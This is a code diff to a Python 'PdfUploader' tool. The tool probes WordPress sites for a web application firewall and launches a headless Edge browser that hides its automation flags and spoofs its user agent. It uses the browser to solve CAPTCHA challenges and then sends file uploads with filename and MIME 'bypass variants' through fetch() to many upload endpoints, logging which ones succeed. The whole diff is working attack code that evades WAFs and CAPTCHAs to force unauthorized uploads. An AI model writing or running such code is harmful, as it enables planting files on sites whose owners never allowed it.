@@ -2257,14 +2257,13 @@ class PdfUploader:
 
     def _bypass_waf(self, site_root):
         """Attempt to bypass detected WAF. Called before upload attempts."""
-        # Probe the site root to trigger WAF and collect cookies
-        status, headers, body = self._request('GET', site_root)
+        # Probe admin-ajax to check for WAF (most likely to be protected)
+        status, headers, body = self._request('GET', site_root + '/wp-admin/admin-ajax.php')
         resp_text = body.decode('utf-8', errors='replace')
         waf = self._detect_waf(resp_text)
 
         if not waf:
-            # Also probe admin-ajax to check
-            status, headers, body = self._request('GET', site_root + '/wp-admin/admin-ajax.php')
+            status, headers, body = self._request('GET', site_root)
             resp_text = body.decode('utf-8', errors='replace')
             waf = self._detect_waf(resp_text)
 
@@ -2272,45 +2271,97 @@ class PdfUploader:
             return  # No WAF detected
 
         self._waf_detected = waf
+        # Use headless browser to solve JS challenges and get cookies
+        self._browser_bypass(site_root)
 
-        if waf == 'sgcaptcha':
-            self._bypass_sgcaptcha(site_root, resp_text)
+    def _get_browser(self):
+        """Get or create a headless Edge browser instance."""
+        if hasattr(self, '_driver') and self._driver:
+            return self._driver
+        try:
+            from selenium.webdriver import Edge, EdgeOptions
 
-    def _bypass_sgcaptcha(self, site_root, initial_resp):
-        """Try to bypass SiteGround CAPTCHA by following the challenge flow."""
-        # Extract the captcha redirect URL from meta refresh
-        m = re.search(r'content="0;([^"]+)"', initial_resp)
-        if not m:
+            opts = EdgeOptions()
+            opts.add_argument('--headless=new')
+            opts.add_argument('--disable-gpu')
+            opts.add_argument('--no-sandbox')
+            opts.add_argument('--disable-dev-shm-usage')
+            opts.add_argument('--disable-blink-features=AutomationControlled')
+            opts.add_experimental_option('excludeSwitches', ['enable-automation'])
+            opts.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                              'AppleWebKit/537.36 (KHTML, like Gecko) '
+                              'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')
+
+            self._driver = Edge(options=opts)
+            self._driver.set_page_load_timeout(30)
+            return self._driver
+        except Exception as e:
+            print(f"[browser] Failed to start: {e}", flush=True)
+            self._driver = None
+            return None
+
+    def _close_browser(self):
+        """Close the browser if open."""
+        if hasattr(self, '_driver') and self._driver:
+            try:
+                self._driver.quit()
+            except Exception:
+                pass
+            self._driver = None
+
+    def _browser_bypass(self, site_root):
+        """Launch headless browser, solve JS captcha, keep it open for uploads."""
+        driver = self._get_browser()
+        if not driver:
             return
-        captcha_path = m.group(1)
-        # Build full URL
-        if captcha_path.startswith('/'):
-            captcha_url = site_root + captcha_path
-        else:
-            captcha_url = site_root + '/' + captcha_path
 
-        # Visit captcha URL — some SG configs set a cookie just from the GET
-        self._request('GET', captcha_url)
+        try:
+            # Load the site — browser auto-solves JS captchas
+            driver.get(site_root)
+            time.sleep(3)
+            # Also visit admin-ajax to establish cookies for that path
+            driver.get(site_root + '/wp-admin/admin-ajax.php')
+            time.sleep(2)
+            self._waf_detected += ' (browser ready)'
+        except Exception as e:
+            print(f"[waf-bypass] Browser navigation failed: {e}", flush=True)
 
-        # Try the sgcaptcha endpoint with various approaches
-        # SG sometimes has a simple cookie-set endpoint
-        sg_paths = [
-            '/.well-known/sgcaptcha/verify',
-            '/.well-known/sgcaptcha/challenge',
-            '/.well-known/sgcaptcha/',
-        ]
-        for path in sg_paths:
-            self._request('GET', site_root + path)
+    def _browser_upload(self, upload_url, field_name, filename, mime, file_bytes, extra_fields=None):
+        """Upload a file using the browser's fetch() — bypasses WAF/TLS fingerprinting."""
+        driver = self._driver if hasattr(self, '_driver') else None
+        if not driver:
+            return None
 
-        # Also try POSTing to the captcha endpoint
-        self._request('POST', captcha_url, {'Content-Type': 'application/x-www-form-urlencoded'}, b'')
+        b64data = base64.b64encode(file_bytes).decode()
+        # Build JS to create FormData and POST via fetch
+        extra_js = ''
+        if extra_fields:
+            for k, v in extra_fields.items():
+                extra_js += f"fd.append('{k}', '{v}');\n"
 
-        # Try requesting the site root again — if cookies work, we'll get through
-        status, _, body = self._request('GET', site_root)
-        # If we get a normal page (not a redirect), cookies worked
-        resp = body.decode('utf-8', errors='replace')
-        if 'sgcaptcha' not in resp.lower() and status == 200:
-            self._waf_detected = 'sgcaptcha (bypassed)'
+        js = f"""
+        return await (async () => {{
+            try {{
+                const raw = atob('{b64data}');
+                const arr = new Uint8Array(raw.length);
+                for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                const blob = new Blob([arr], {{type: '{mime}'}});
+                const fd = new FormData();
+                fd.append('{field_name}', blob, '{filename}');
+                {extra_js}
+                const resp = await fetch('{upload_url}', {{method: 'POST', body: fd}});
+                const text = await resp.text();
+                return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
+            }} catch(e) {{
+                return JSON.stringify({{status: 0, body: e.message}});
+            }}
+        }})();
+        """
+        try:
+            result_str = driver.execute_script(js)
+            return json.loads(result_str)
+        except Exception as e:
+            return {'status': 0, 'body': str(e)}
 
     def _multipart_body(self, field_name, filename, content_type, file_bytes, extra_fields=None):
         """Build multipart/form-data. Returns (body_bytes, content_type_header)."""
@@ -2627,6 +2678,131 @@ class PdfUploader:
                         return
 
         self._auto_info['endpoints_tried'] = total_tried
+
+        # If WAF blocked everything, retry using the headless browser
+        if self._waf_detected and not any(t['success'] for t in self.techniques):
+            self._browser_upload_pass(endpoints, bypass_variants)
+            self._close_browser()
+
+    def _browser_upload_pass(self, endpoints, bypass_variants):
+        """Retry uploads through the headless browser (bypasses WAF + TLS checks)."""
+        driver = self._driver if hasattr(self, '_driver') else None
+        if not driver:
+            return
+
+        base_name = self.pdf_filename.rsplit('.', 1)[0] if '.' in self.pdf_filename else self.pdf_filename
+        tried = 0
+
+        for ep in endpoints:
+            if ep.get('body_type') in ('put_direct', 'xmlrpc'):
+                continue  # Skip non-multipart types in browser
+
+            ep_name = ep.get('name', 'Unknown')
+            field = ep.get('field', 'file')
+            extra = ep.get('extra')
+
+            if ep.get('body_type') == 'raw':
+                # Raw POST via browser fetch
+                tried += 1
+                hdrs = dict(ep.get('headers') or {})
+                for k, v in hdrs.items():
+                    if '{filename}' in v:
+                        hdrs[k] = v.replace('{filename}', self.pdf_filename)
+                ct = hdrs.get('Content-Type', 'application/pdf')
+                cd = hdrs.get('Content-Disposition', '')
+                b64data = base64.b64encode(self.pdf_bytes).decode()
+                js = f"""
+                return await (async () => {{
+                    try {{
+                        const raw = atob('{b64data}');
+                        const arr = new Uint8Array(raw.length);
+                        for (let i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+                        const resp = await fetch('{ep["url"]}', {{
+                            method: 'POST',
+                            headers: {{'Content-Type': '{ct}', 'Content-Disposition': '{cd}'}},
+                            body: arr
+                        }});
+                        const text = await resp.text();
+                        return JSON.stringify({{status: resp.status, body: text.substring(0, 2000)}});
+                    }} catch(e) {{ return JSON.stringify({{status: 0, body: e.message}}); }}
+                }})();
+                """
+                try:
+                    res = json.loads(driver.execute_script(js))
+                except Exception as e:
+                    res = {'status': 0, 'body': str(e)}
+
+                resp_text = res.get('body', '')
+                status = res.get('status', 0)
+                success = False
+                upload_url_found = ''
+                if 200 <= status < 400 and not self._is_waf_response(resp_text):
+                    for kw in ['success', 'uploaded', '"url"', 'source_url', 'file_url']:
+                        if kw in resp_text.lower():
+                            success = True
+                            break
+                if success:
+                    try:
+                        rj = json.loads(resp_text)
+                        for key in ['url', 'source_url', 'file_url', 'link']:
+                            val = rj.get(key, '')
+                            if isinstance(val, str) and val.startswith('http'):
+                                upload_url_found = val
+                                break
+                    except Exception:
+                        pass
+
+                self.techniques.append({
+                    'name': f'{ep_name} | Browser',
+                    'http_status': status,
+                    'success': success,
+                    'response_snippet': resp_text[:500],
+                    'upload_url': upload_url_found,
+                })
+                if success and upload_url_found and self._verify_url(upload_url_found):
+                    self._auto_info['endpoints_tried'] += tried
+                    return
+                continue
+
+            # Multipart upload via browser fetch
+            for variant_name, filename, mime, file_bytes in bypass_variants:
+                tried += 1
+                res = self._browser_upload(ep['url'], field, filename, mime, file_bytes, extra)
+                if not res:
+                    continue
+
+                resp_text = res.get('body', '')
+                status = res.get('status', 0)
+                success = False
+                upload_url_found = ''
+                if 200 <= status < 400 and not self._is_waf_response(resp_text):
+                    for kw in ['success', 'uploaded', '"url"', 'source_url', 'file_url', 'tmp_name']:
+                        if kw in resp_text.lower():
+                            success = True
+                            break
+                if success:
+                    try:
+                        rj = json.loads(resp_text)
+                        for key in ['url', 'source_url', 'file_url', 'link', 'path']:
+                            val = rj.get(key, '')
+                            if isinstance(val, str) and val.startswith('http'):
+                                upload_url_found = val
+                                break
+                    except Exception:
+                        pass
+
+                self.techniques.append({
+                    'name': f'{ep_name} | {variant_name} | Browser',
+                    'http_status': status,
+                    'success': success,
+                    'response_snippet': resp_text[:500],
+                    'upload_url': upload_url_found,
+                })
+                if success and upload_url_found and self._verify_url(upload_url_found):
+                    self._auto_info['endpoints_tried'] += tried
+                    return
+
+        self._auto_info['endpoints_tried'] += tried
 
     def _analyze_form_page(self):
         """GET the page, then ask AI to analyze the form."""
